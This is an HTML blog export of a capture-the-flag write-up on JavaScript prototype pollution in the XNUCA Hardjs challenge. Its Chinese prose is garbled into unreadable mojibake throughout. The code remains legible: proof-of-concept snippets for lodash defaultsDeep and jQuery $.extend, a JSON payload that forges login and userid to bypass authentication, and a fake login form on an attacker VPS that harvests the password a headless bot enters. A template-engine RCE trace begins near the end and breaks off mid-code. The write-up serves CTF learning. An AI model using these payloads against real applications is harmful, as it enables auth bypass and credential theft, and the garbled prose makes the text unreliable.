    <content><![CDATA[<p>é€šè¿‡å‡ é“ctfé¢˜å­¦ä¹ Javascript åŸå‹é“¾æ±¡æŸ“ </p>
<a id="more"></a>

<h1 id="JavaScriptåŸå‹é“¾æ±¡æŸ“"><a href="#JavaScriptåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="JavaScriptåŸå‹é“¾æ±¡æŸ“"></a>JavaScriptåŸå‹é“¾æ±¡æŸ“</h1><p>javascriptåŸå‹é“¾æ±¡æŸ“ï¼Œç½‘ä¸Šä»‹ç»åŸç†çš„æ–‡ç« å·²ç»å¾ˆå¤šäº†ï¼Œæœ€ç»å…¸çš„è¿˜æ˜¯Pç¥åˆ†æçš„é‚£ç¯‡<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œè¿™é‡Œå°±ä¸åœ¨è¯¦ç»†çš„ä»‹ç»åŸç†äº†ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯</p>
<blockquote>
<p>åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p>
</blockquote>
<p>æœ€åä¸Šä¸€å¼ å›¾ï¼Œæ¥æ›´æ¸…æ™°çš„ç†è§£ã€‚</p>
<img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225142328583.png" alt="image-20200225142328583" style="zoom:200%;">

<h3 id="XNUCA-Hardjs"><a href="#XNUCA-Hardjs" class="headerlink" title="XNUCA Hardjs"></a>XNUCA Hardjs</h3><p>è¿™é“é¢˜æœ‰å¾ˆå¤šè§£ï¼Œæˆ‘ä»¬å¯ä»¥ä¸‹åˆ°æºç ï¼Œåœ¨ç½‘é¡µä¸Šäº†è§£ä¸€ä¸‹å¤§è‡´çš„åŠŸèƒ½ï¼Œå¯ä»¥æ³¨å†Œã€ç™»å½•ã€‚ç™»å½•åå¯ä»¥æ·»åŠ ä¸€äº›å†…å®¹ã€‚æ¥ä¸‹æ¥å®¡è®¡æºç ï¼Œè¿™ç§æœ‰<code>package.json</code>æ–‡ä»¶çš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨<code>npm  audit</code>å‘½ä»¤æ¥æ£€æµ‹ä¸€ä¸‹ç¬¬ä¸‰æ–¹çš„åº“æœ‰æ²¡æœ‰æ¼æ´ã€‚</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225142924459.png" alt="image-20200225142924459"></p>
<p>å¯ä»¥çœ‹åˆ°lodashåŒ…æœ‰åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚</p>
<p>æ‰¾åˆ°<a href="https://snyk.io/vuln/SNYK-JS-LODASH-450202" target="_blank" rel="noopener">poc</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å®¡è®¡æºç ï¼Œ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">"/get"</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.session.userid ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select count(*) count from `html` where userid= ?"</span></span><br><span class="line">    <span class="comment">// var sql = "select `dom` from  `html` where userid=? ";</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">        res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">            lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.push(doms);</span><br><span class="line">            res.json(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.json([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Return recorder is less than 5,so return it without merge."</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.length ; i++)&#123;</span><br><span class="line">            ret.push(<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(ret);</span><br><span class="line">        res.json(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åœ¨getè·¯ç”±ä¸­<code>dataList[0].count &gt; 5</code>æ—¶ï¼Œä¼šè¿›è¡Œmerge,å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶raws[i].domï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œå®¡è®¡æºç å¯ä»¥çŸ¥é“raws[i].domä¸ºæˆ‘ä»¬åœ¨addè·¯ç”±ä¸­è¾“å…¥çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œç„¶åæˆ‘ä»¬å»æ‰¾å¯ä»¥æ±¡æŸ“çš„å¯¹è±¡ï¼Œä¸€èˆ¬å¦‚æœçœ‹åˆ°å½¢å¦‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(aaaaa.xxxx)</span><br><span class="line">&#123;</span><br><span class="line">		..........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„å°±å¯ä»¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“æ¥è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚</p>
<h4 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h4><p>é¢˜ç›®ç»™çš„æºç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹è§æœ‰ä¸€ä¸ªrebot.pyï¼Œå¹¶ä¸”å…¶ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chrome_options.add_argument(<span class="string">'--disable-xss-auditor'</span>)</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆï¼Œxssä¸€å®šæ˜¯å‡ºé¢˜äººç•™çš„ä¸€æ¡åˆ©ç”¨é“¾ï¼Œä»rebot.pyå¯ä»¥çœ‹åˆ°ï¼Œå¯†ç å°±æ˜¯flagï¼Œbotæ˜¯ç›´æ¥è®¿é—®çš„127.0.0.1ï¼Œç„¶åä»å“åº”ä¸­æå–ç”¨æˆ·åå’Œå¯†ç çš„è¾“å…¥æ¡†ï¼Œç„¶åè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç™»å½•ã€‚è¿™é‡Œçœ‹ä¸Šå»æˆ‘ä»¬æ˜¯æ²¡åŠæ³•åˆ©ç”¨çš„ï¼Œä½†æ˜¯åˆ†ææˆ‘ä»¬å¯ä»¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“æ¥bypassã€‚åœ¨å‰ç«¯çš„ä»£ç ä¸­ï¼Œç”¨äº†3.3.0ç‰ˆæœ¬çš„jqueryï¼Œjqueryçš„$.extendæ–¹æ³•ä¹Ÿå­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼Œ</p>
<p>poc:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode": true&#125;&#125;'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.devMode); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>åœ¨å‰ç«¯app.jsä¸­</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params">allNode</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		url:<span class="string">"/get"</span>,</span><br><span class="line">		type:<span class="string">"get"</span>,</span><br><span class="line">		<span class="keyword">async</span>:<span class="literal">false</span>,</span><br><span class="line">		success: <span class="function"><span class="keyword">function</span>(<span class="params">datas</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ;i&lt;datas.length; i++)&#123;</span><br><span class="line">				$.extend(<span class="literal">true</span>,allNode,datas[i])</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// console.log(allNode);</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†$.extend()æ–¹æ³•ï¼Œ</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225145755746.png" alt="image-20200225145755746"></p>
<p>å¹¶ä¸”è¿™ä¸ªgetAllä¼šåœ¨é¡µé¢åŠ è½½çš„æ—¶å€™æ‰§è¡Œã€‚å¹¶ä¸”åœ¨åŠ è½½é¡µé¢çš„ä¾¯è¿˜è¿›è¡Œäº†é¡µé¢åŠ¨æ€æ¸²æŸ“ï¼Œ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> hints = &#123;</span><br><span class="line">		header : <span class="string">"è‡ªå®šä¹‰å†…å®¹"</span>,</span><br><span class="line">		notice: <span class="string">"è‡ªå®šä¹‰å…¬å‘Š"</span>,</span><br><span class="line">		wiki : <span class="string">"è‡ªå®šä¹‰wiki"</span>,</span><br><span class="line">		button:<span class="string">"è‡ªå®šä¹‰å†…å®¹"</span>,</span><br><span class="line">		message: <span class="string">"è‡ªå®šä¹‰ç•™è¨€å†…å®¹"</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span>(key <span class="keyword">in</span> hints)&#123;</span><br><span class="line">		<span class="comment">// console.log(key);</span></span><br><span class="line">		element = $(<span class="string">"li[type='"</span>+key+<span class="string">"']"</span>); </span><br><span class="line">		<span class="keyword">if</span>(element)&#123;</span><br><span class="line">			element.find(<span class="string">"span.content"</span>).html(hints[key]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“åœ¨é¡µé¢åŠ è½½çš„æ—¶å€™åœ¨é¡µé¢ä¸­æ’å…¥ç™»å½•è¡¨å•å¹¶é“¾æ¥åˆ°æˆ‘ä»¬çš„vps,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œxss,å¾—åˆ°flagäº†ã€‚åœ¨ä¸Šé¢åŠ¨æ€æ¸²æŸ“çš„æ—¶å€™ï¼Œä¼šæŠŠhintsçš„é”®å€¼å¯¹æ¸²æŸ“åˆ°é¡µé¢ï¼Œå¦‚æœæˆ‘ä»¬åƒè¦æ’å…¥ä¸œè¥¿çš„è¯ï¼Œå°±å¿…é¡»å¯»æ‰¾ä¸€ä¸ªæ—¢æœ‰type åˆæœ‰contentçš„æ ‡ç­¾ã€‚loggeråˆšå¥½èƒ½æ»¡è¶³è¿™ä¸ªæ¡ä»¶ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"am-g error-log"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"am-list am-in"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">type</span>=<span class="string">"logger"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-12 col-sm-centered"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">"am-pre-scrollable"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-success"</span>&gt;</span>[Tue Jan 11 17:32:52 9]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-danger"</span>&gt;</span>[info]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>StoreHtml init success .....<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹æœç„¶å¯ä»¥ã€‚</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225151619001.png" alt>é‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨è¿™é‡Œæ’å…¥ä¸€ä¸ªç™»å½•çš„è¡¨å•ï¼Œæˆ–è€…ä¸€ä¸ªè¡¨å•é‡å®šå‘çš„é“¾æ¥ï¼Œå°±å¯ä»¥è¿›è¡Œxssäº†ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯boté»˜è®¤è®¿é—®127.0.0.1æ—¶è¿›å…¥çš„æ—¶ç™»å½•ç•Œé¢ï¼Œä¸ä¼šæ˜¯æˆ‘ä»¬åŸå‹é“¾æ±¡æŸ“åçš„ç•Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­çœ‹ï¼Œåœ¨server.jsä¸­</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">"/"</span>,auth,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">'index'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">"/login"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>/è·¯ç”±ä¸­ï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡äº†authå‡½æ•°ï¼Œå°±ä¼šç›´æ¥åˆ°indexçš„æ¨¡æ¿ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸ªauthå‡½æ•°ï¼Œåœ¨å‡½æ•°ä¸­ï¼Œå¼€å§‹çš„æ—¶å€™sessionæ˜¯æ²¡æœ‰loginå’Œuseridå±æ€§çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“æ¥ç»•è¿‡è¿™é‡Œã€‚ä»è€Œè¾¾åˆ°æˆ‘ä»¬çš„åˆ©ç”¨ç›®çš„ã€‚</p>
<p>ä¸‹é¢æ˜¯å®é™…æ“ä½œçš„æ­¥éª¤</p>
<p>å…ˆæ³¨å†Œç™»å½•ï¼Œé‡å¤å‘é€6æ¬¡payloadï¼Œç»•è¿‡authå‡½æ•°ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"test"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"login"</span>:<span class="literal">true</span>,<span class="attr">"userid"</span>:<span class="number">1</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225153310973.png" alt="image-20200225153310973"></p>
<p>ç„¶åæˆ‘ä»¬è®¿é—®getç•Œé¢ï¼Œè§¦å‘åŸå‹é“¾æ±¡æŸ“ï¼Œç„¶åæ¸…ç©ºcookie,ä»å¯è®¿é—®ï¼Œè¯´æ˜å·²ç»ç»•è¿‡authå‡½æ•°ï¼Œæ¥ä¸‹æ¥æ’å…¥logger</p>
<p>,åœ¨vpsä¸Šå†™å¥½ç™»å½•æ¡†</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">class</span>=<span class="string">"am-form"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"email"</span>&gt;</span>ç”¨æˆ·å:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">id</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span>å¯†ç :<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"remember-me"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"remember-me"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>&gt;</span></span><br><span class="line">          è®°ä½å¯†ç </span><br><span class="line">        <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"am-cf"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"ç™»å½•"</span> <span class="attr">class</span>=<span class="string">"am-btn am-btn-primary am-btn-sm am-fl"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"location.replace('&lt;%= next %&gt;')"</span> <span class="attr">value</span>=<span class="string">"æ³¨å†Œ"</span> <span class="attr">class</span>=<span class="string">"am-btn am-btn-default am-btn-sm am-fr"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå‘é€payloadï¼Œç­‰å¾…botç‚¹å‡»ï¼Œå»vpsæ”¶flagã€‚</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225154218671.png" alt="image-20200225154218671"></p>
<p>ä»¥ä¸Šæ˜¯å‰ç«¯åŠ åç«¯çš„åšæ³•ã€‚</p>
<h4 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h4><p>è¿™é“é¢˜è¿˜æœ‰ä¸€ç§åç«¯sysæ¨¡æ¿rceçš„æ–¹æ³•ï¼Œç”±äºæ¨¡æ¿å¼•æ“å­˜åœ¨å˜é‡æ‹¼æ¥çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥å­˜åœ¨RCEçš„å¯èƒ½ï¼Œç„¶åæˆ‘ä»¬è·Ÿè¿›res.render()å‡½æ•°å»åˆ†æï¼Œåˆ°response.jsçš„renderå‡½æ•°</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175640508.png" alt="image-20200225175640508"></p>
<p>ä¸€äº›mergeä¹‹åï¼Œè°ƒç”¨ç„¶åè·Ÿåˆ°app.render()å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175813279.png" alt="image-20200225175813279"></p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175935554.png" alt="image-20200225175935554"></p>
<p>è·Ÿè¿›tryRender()å‡½æ•°</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180110538.png" alt="image-20200225180110538"></p>
<p>è·Ÿåˆ°view.jsä¸­çš„render()å‡½æ•°</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180159127.png" alt="image-20200225180159127"></p>
<p>åˆ°engine()å‡½æ•°ï¼Œåˆè·Ÿåˆ°ejs.jsçš„æ¸²æŸ“å¼•æ“çš„æ¸²æŸ“å‡½æ•°exports.renderFile()</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180528375.png" alt="image-20200225180528375"></p>
<p>//â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225191935895.png" alt="image-20200225191935895"></p>
<p>è¿™é‡Œçœç•¥äº†ä¸€äº›æ— å…³çš„ä»£ç ã€‚renderFile()å‡½æ•°åé¢åˆè°ƒç”¨äº†tryHandleCache()ï¼Œç»§ç»­è·Ÿè¿›ï¼Œ</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180656822.png" alt="image-20200225180656822"></p>
<p>è¿™é‡Œåˆè·Ÿè¿›åˆ°handleCache()å‡½æ•°</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225181034328.png" alt="image-20200225181034328"></p>
<p>ç„¶åè·Ÿè¿›exports.compile()å‡½æ•°</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225181212417.png" alt="image-20200225181212417"></p>
<p>è¿™é‡Œ newäº†ä¸€ä¸ªTemplateï¼Œç„¶åè°ƒç”¨äº†å…¶compile()å‡½æ•°ï¼Œè·Ÿè¿›</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src;</span><br><span class="line">    <span class="keyword">var</span> fn;</span><br><span class="line">    <span class="keyword">var</span> opts = <span class="keyword">this</span>.opts;</span><br><span class="line">    <span class="keyword">var</span> prepended = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> appended = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> escapeFn = opts.escapeFunction;</span><br><span class="line">    <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.source) &#123;</span><br><span class="line">      <span class="keyword">this</span>.generateSource();</span><br><span class="line">      prepended += <span class="string">'  var __output = 